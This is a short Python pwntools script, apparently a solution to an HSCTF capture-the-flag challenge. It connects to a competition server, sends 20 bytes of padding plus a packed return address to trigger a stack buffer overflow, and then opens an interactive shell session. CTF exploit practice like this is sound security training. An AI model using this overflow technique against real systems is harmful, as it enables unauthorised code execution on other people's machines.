author = 'Elhanan'


x = 0x080491B6
from pwn import *


sh = remote('pwn.hsctf.com',  1234)
print sh.recvuntil('today?')

y='asdfghjklp1234567890'+p32(x)
sh.sendline(y)

#print sh.recvuntil('?\n')

#print sh.recvall()



sh.interactive()
